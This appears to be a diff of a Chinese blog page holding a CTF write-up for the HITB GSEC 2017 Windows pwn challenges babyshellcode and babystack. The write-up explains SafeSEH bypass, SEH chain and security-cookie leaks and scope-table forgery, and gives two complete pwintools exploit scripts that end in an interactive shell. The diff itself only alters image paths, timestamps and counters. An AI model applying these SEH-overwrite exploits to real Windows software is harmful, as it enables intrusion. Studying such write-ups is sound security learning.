@@ -127,18 +127,18 @@
 <meta property="og:site_name" content="w4rd3n">
 <meta property="og:description" content="babyshellcode  这里工具对SafeSEH检测出现了问题,实际上是开了的. name的输入存在溢出,后面printf存在泄露,这个溢出不能利用,因为无可利用的地址. Create shellcode对堆的申请使用的是VirtualAlloc,同时参数flprotect值为0x40,表示拥有RWE权限.Run shellcode中存在memcpy导致的栈溢出,触发的同时会修改堆内">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:image" content="https://hitworld.github.io/posts/748eb64e/1.png">
-<meta property="og:image" content="https://hitworld.github.io/posts/748eb64e/2.png">
-<meta property="og:image" content="https://hitworld.github.io/posts/748eb64e/3.png">
-<meta property="og:image" content="https://hitworld.github.io/posts/748eb64e/4.png">
-<meta property="og:image" content="https://hitworld.github.io/posts/748eb64e/5.png">
-<meta property="og:image" content="https://hitworld.github.io/posts/748eb64e/6.png">
-<meta property="og:image" content="https://hitworld.github.io/posts/748eb64e/7.png">
-<meta property="og:updated_time" content="2020-08-26T04:53:53.321Z">
+<meta property="og:image" content="https://hitworld.github.io/posts/undefined/1.png">
+<meta property="og:image" content="https://hitworld.github.io/posts/undefined/2.png">
+<meta property="og:image" content="https://hitworld.github.io/posts/undefined/3.png">
+<meta property="og:image" content="https://hitworld.github.io/posts/undefined/4.png">
+<meta property="og:image" content="https://hitworld.github.io/posts/undefined/5.png">
+<meta property="og:image" content="https://hitworld.github.io/posts/undefined/6.png">
+<meta property="og:image" content="https://hitworld.github.io/posts/undefined/7.png">
+<meta property="og:updated_time" content="2020-08-26T08:16:53.843Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="writeup-hitb-gsec-2017-winpwn">
 <meta name="twitter:description" content="babyshellcode  这里工具对SafeSEH检测出现了问题,实际上是开了的. name的输入存在溢出,后面printf存在泄露,这个溢出不能利用,因为无可利用的地址. Create shellcode对堆的申请使用的是VirtualAlloc,同时参数flprotect值为0x40,表示拥有RWE权限.Run shellcode中存在memcpy导致的栈溢出,触发的同时会修改堆内">
-<meta name="twitter:image" content="https://hitworld.github.io/posts/748eb64e/1.png">
+<meta name="twitter:image" content="https://hitworld.github.io/posts/undefined/1.png">
 
 
 
@@ -539,7 +539,7 @@
 
       
         <h2 id="babyshellcode">babyshellcode</h2>
-<img src="/posts/748eb64e/1.png" title="p1">
+<img src="/posts/undefined/1.png" title="p1">
 <p>这里工具对<code>SafeSEH</code>检测出现了问题,实际上是开了的.</p>
 <p><code>name</code>的输入存在溢出,后面<code>printf</code>存在泄露,这个溢出不能利用,因为无可利用的地址.</p>
 <p><code>Create shellcode</code>对堆的申请使用的是<code>VirtualAlloc</code>,同时参数<code>flprotect</code>值为<code>0x40</code>,表示拥有<code>RWE</code>权限.<code>Run shellcode</code>中存在<code>memcpy</code>导致的栈溢出,触发的同时会修改堆内存的前四个字节为<code>0xffffffff</code>,然后调用触发异常处理.</p>
@@ -549,21 +549,21 @@
 <p><code>Win10</code>环境使用<code>name</code>处漏洞泄露<code>SEH Chain</code>的<code>next</code>域绕过<code>check</code>.</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=UTF-8</span></span><br><span class="line"><span class="keyword">from</span> pwintools <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_scmgr_base</span><span class="params">(check)</span>:</span></span><br><span class="line">  <span class="keyword">for</span> base <span class="keyword">in</span> range(<span class="number">0x60000000</span>, <span class="number">0x80000000</span>, <span class="number">0x10000</span>):</span><br><span class="line">  <span class="comment">#0x8000000之上是内核空间</span></span><br><span class="line">    init_scmgr = base + <span class="number">0x1090</span></span><br><span class="line">    g_table = [init_scmgr]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">31</span>):</span><br><span class="line">        init_scmgr = (init_scmgr * <span class="number">69069</span>) &amp; <span class="number">0xffffffff</span></span><br><span class="line">        g_table.append(init_scmgr)</span><br><span class="line">    g_index = <span class="number">0</span></span><br><span class="line">    v0 = (g_index<span class="number">-1</span>) &amp; <span class="number">0x1f</span></span><br><span class="line">    v2 = g_table[(g_index + <span class="number">3</span>) &amp; <span class="number">0x1f</span>] ^ g_table[g_index] ^ (g_table[(g_index + <span class="number">3</span>) &amp; <span class="number">0x1f</span>] &gt;&gt; <span class="number">8</span>)</span><br><span class="line">    v1 = g_table[v0]</span><br><span class="line">    v3 = g_table[(g_index + <span class="number">10</span>) &amp; <span class="number">0x1F</span>]</span><br><span class="line">    v4 = g_table[(g_index - <span class="number">8</span>) &amp; <span class="number">0x1F</span>] ^ v3 ^ ((v3 ^ (<span class="number">32</span> * g_table[(g_index - <span class="number">8</span>) &amp; <span class="number">0x1F</span>])) &lt;&lt; <span class="number">14</span>)</span><br><span class="line">    v4 = v4 &amp; <span class="number">0xffffffff</span></span><br><span class="line">    g_table[g_index] = v2 ^ v4</span><br><span class="line">    g_table[v0] = (v1 ^ v2 ^ v4 ^ ((v2 ^ (<span class="number">16</span> * (v1 ^ <span class="number">4</span> * v4))) &lt;&lt; <span class="number">7</span>)) &amp; <span class="number">0xffffffff</span></span><br><span class="line">    g_index = (g_index - <span class="number">1</span>) &amp; <span class="number">0x1F</span></span><br><span class="line">    <span class="keyword">if</span>(g_table[g_index] == check):</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"base: "</span> + hex(base)</span><br><span class="line">        <span class="keyword">return</span> base + <span class="number">0x1100</span></span><br><span class="line"></span><br><span class="line">r = Process(<span class="string">"babyshellcode.exe"</span>)</span><br><span class="line">r.recv(<span class="number">200</span>)</span><br><span class="line">r.sendline(<span class="string">"aaaa"</span> * <span class="number">20</span>)</span><br><span class="line">seh_next = u32(r.recv(<span class="number">200</span>)[<span class="number">86</span>:<span class="number">90</span>]) - <span class="number">108</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"seh_next: "</span> + hex(seh_next)</span><br><span class="line">r.sendline(<span class="string">"5"</span>)</span><br><span class="line">r.recv(<span class="number">200</span>)</span><br><span class="line">r.sendline(<span class="string">"1"</span>)</span><br><span class="line">check = r.recv(<span class="number">200</span>).split(<span class="string">"-"</span>)[<span class="number">5</span>][:<span class="number">8</span>]</span><br><span class="line">check = int(check, <span class="number">16</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"check: "</span> + hex(check)</span><br><span class="line">get_shell = get_scmgr_base(check)</span><br><span class="line">r.sendline(<span class="string">"w4rd3n"</span>)</span><br><span class="line">r.recv(<span class="number">200</span>)</span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">"a"</span> * <span class="number">0x70</span></span><br><span class="line">shellcode += p32(seh_next) + p32(get_shell)</span><br><span class="line">r.sendline(<span class="string">"1"</span>)</span><br><span class="line">r.recv(<span class="number">200</span>)</span><br><span class="line">r.sendline(str(len(shellcode)))</span><br><span class="line">r.recv(<span class="number">200</span>)</span><br><span class="line">r.sendline(<span class="string">"1"</span>)</span><br><span class="line">r.recv(<span class="number">200</span>)</span><br><span class="line">r.sendline(<span class="string">"1"</span>)</span><br><span class="line">r.recv(<span class="number">200</span>)</span><br><span class="line">r.sendline(shellcode)</span><br><span class="line">r.recv(<span class="number">200</span>)</span><br><span class="line">r.sendline(<span class="string">"4"</span>)</span><br><span class="line">r.recv(<span class="number">200</span>)</span><br><span class="line">r.sendline(<span class="string">"0"</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
 <p>纪念以下第一次复现<code>winpwn</code>.</p>
-<img src="/posts/748eb64e/2.png" title="p2">
+<img src="/posts/undefined/2.png" title="p2">
 <h2 id="babystack">babystack</h2>
-<img src="/posts/748eb64e/3.png" title="p3">
+<img src="/posts/undefined/3.png" title="p3">
 <p>这里工具对<code>SafeSEH</code>检测出现了问题,实际上是开了的.</p>
 <p>开局给了栈地址和<code>main</code>函数地址.程序中还有个隐藏的<code>system("cmd")</code>.</p>
-<img src="/posts/748eb64e/4.png" title="p4">
+<img src="/posts/undefined/4.png" title="p4">
 <p>由于程序退出使用的是<code>exit(0)</code>,所以劫持<code>eip</code>失效.</p>
 <p>这里的思路还是通过<code>SEH</code>异常处理,由于没有合适的条件直接绕过<code>SafeSEH</code>劫持<code>SEH Handler</code>(这里会与<code>SEH</code>表比对),这里需要伪造<code>scope table</code>.</p>
-<img src="/posts/748eb64e/5.png" title="p5">
+<img src="/posts/undefined/5.png" title="p5">
 <p>在主函数中<code>scope table</code>域指针被加密并放入了栈中.</p>
-<img src="/posts/748eb64e/6.png" title="p6">
+<img src="/posts/undefined/6.png" title="p6">
 <p><code>_except_handler4</code>异常处理函数会调用<code>VCRUNTIME140!_except_handler4_common</code>,逆向其逻辑,其最后会调用<code>HandlerFunc</code>.</p>
 <p>由于要覆盖<code>scope table</code>域指针同时维护<code>SEH</code>链所以要泄露<code>SEH</code>的<code>next</code>和<code>handler</code>,又因为是加密的所以还要泄露<code>___security_cookie</code>.</p>
 <p><code>VCRUNTIME140!_except_handler4_common</code>中还对<code>ebp - 0x1C</code>处进行了检测,这个值是<code>ebp</code>异或<code>___security_cookie</code>,也需要<code>fix</code>.</p>
-<img src="/posts/748eb64e/7.png" title="p7">
+<img src="/posts/undefined/7.png" title="p7">
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=UTF-8</span></span><br><span class="line"><span class="keyword">from</span> pwintools <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = Process(<span class="string">"babystack.exe"</span>)</span><br><span class="line">r.recvline()</span><br><span class="line">stack = int(r.recvline().split(<span class="string">"0x"</span>)[<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line">main = int(r.recvline().split(<span class="string">"0x"</span>)[<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"stack: "</span> + hex(stack)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"main: "</span> + hex(main)</span><br><span class="line"></span><br><span class="line">r.recvline()</span><br><span class="line">r.sendline(<span class="string">"yes"</span>)</span><br><span class="line">r.recvline()</span><br><span class="line">r.sendline(str(stack + <span class="number">140</span>))</span><br><span class="line">seh_next = int(r.recvline().split(<span class="string">"0x"</span>)[<span class="number">2</span>], <span class="number">16</span>) </span><br><span class="line"><span class="keyword">print</span> <span class="string">"seh_next: "</span> + hex(seh_next)</span><br><span class="line"></span><br><span class="line">r.recvline()</span><br><span class="line">r.sendline(<span class="string">"yes"</span>)</span><br><span class="line">r.recvline()</span><br><span class="line">r.sendline(str(stack + <span class="number">144</span>))</span><br><span class="line">seh_handle = int(r.recvline().split(<span class="string">"0x"</span>)[<span class="number">2</span>], <span class="number">16</span>) </span><br><span class="line"><span class="keyword">print</span> <span class="string">"seh_handle: "</span> + hex(seh_handle)</span><br><span class="line"></span><br><span class="line">r.recvline()</span><br><span class="line">r.sendline(<span class="string">"yes"</span>)</span><br><span class="line">r.recvline()</span><br><span class="line">r.sendline(str(main + <span class="number">12116</span>))</span><br><span class="line">security_cookie = int(r.recvline().split(<span class="string">"0x"</span>)[<span class="number">2</span>], <span class="number">16</span>) </span><br><span class="line"><span class="keyword">print</span> <span class="string">"security_cookie: "</span> + hex(security_cookie)</span><br><span class="line"></span><br><span class="line">fake_scope_table = security_cookie ^ (stack + <span class="number">0x64</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"fake_scope_table: "</span> + hex(fake_scope_table)</span><br><span class="line"></span><br><span class="line">r.recvline()</span><br><span class="line">r.sendline(<span class="string">"yes"</span>)</span><br><span class="line">r.recvline()</span><br><span class="line">r.sendline(str(stack + <span class="number">128</span>))</span><br><span class="line">check = int(r.recvline().split(<span class="string">"0x"</span>)[<span class="number">2</span>], <span class="number">16</span>) </span><br><span class="line"><span class="keyword">print</span> <span class="string">"check: "</span> + hex(check)</span><br><span class="line"></span><br><span class="line">r.recvline()</span><br><span class="line">r.sendline(<span class="string">"go"</span>)</span><br><span class="line">payload = <span class="string">""</span></span><br><span class="line">payload += <span class="string">"a"</span> * <span class="number">0x64</span></span><br><span class="line">payload += <span class="string">"\xe4\xff\xff\xff"</span> + p32(<span class="number">0</span>) + <span class="string">"\x20\xff\xff\xff"</span> + p32(<span class="number">0</span>)</span><br><span class="line">payload += <span class="string">"\xfe\xff\xff\xff"</span> + p32(main + <span class="number">664</span>) + p32(main + <span class="number">733</span>)</span><br><span class="line">payload += p32(check) + <span class="string">"a"</span> * <span class="number">8</span> + p32(seh_next) + p32(seh_handle) + p32(fake_scope_table)</span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">r.recvline()</span><br><span class="line">r.sendline(<span class="string">"yes"</span>)</span><br><span class="line">r.recvline()</span><br><span class="line">r.sendline(str(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
 
       
@@ -687,7 +687,7 @@
                 
                   <a href="/archives/">
                 
-                    <span class="site-state-item-count">171</span>
+                    <span class="site-state-item-count">169</span>
                     <span class="site-state-item-name">日志</span>
                   </a>
                 </div>
@@ -829,7 +829,9 @@
                     
                       
                     
-                    <span class="site-state-item-count">43</span>
+                      
+                    
+                    <span class="site-state-item-count">44</span>
                     <span class="site-state-item-name">标签</span>
                   </a>
                 </div>
@@ -911,7 +913,7 @@
       <i class="fa fa-area-chart"></i>
     </span>
     
-    <span title="站点总字数">705k</span>
+    <span title="站点总字数">704k</span>
   
 
   
@@ -920,7 +922,7 @@
       <i class="fa fa-coffee"></i>
     </span>
     
-    <span title="站点阅读时长">10:41</span>
+    <span title="站点阅读时长">10:40</span>
   
 </div>
 
